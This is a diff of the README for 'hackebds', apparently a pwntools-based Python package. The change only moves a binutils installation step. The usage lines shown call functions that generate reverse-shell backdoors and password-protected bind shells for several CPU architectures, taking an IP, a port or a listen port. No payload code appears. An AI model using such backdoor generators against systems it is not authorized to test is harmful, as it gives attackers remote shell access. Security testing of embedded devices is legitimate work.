@@ -27,6 +27,13 @@ pip install hackebds==0.1.5
 #### Instructions for use
 
 When importing this module will import the pwn module
+```
+Please install the corresponding binutils environment before use
+expample:
+```
+apt search binutils | grep arm（You can replace it here）
+apt install binutils-arm-linux-gnueabi/hirsute
+```
 
 1. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
@@ -43,13 +50,7 @@ When importing this module will import the pwn module
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
-```
-Please install the corresponding binutils environment before use
-expample:
-```
-apt search binutils | grep arm（You can replace it here）
-apt install binutils-arm-linux-gnueabi/hirsute
-```
+
 
 （Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
 ```
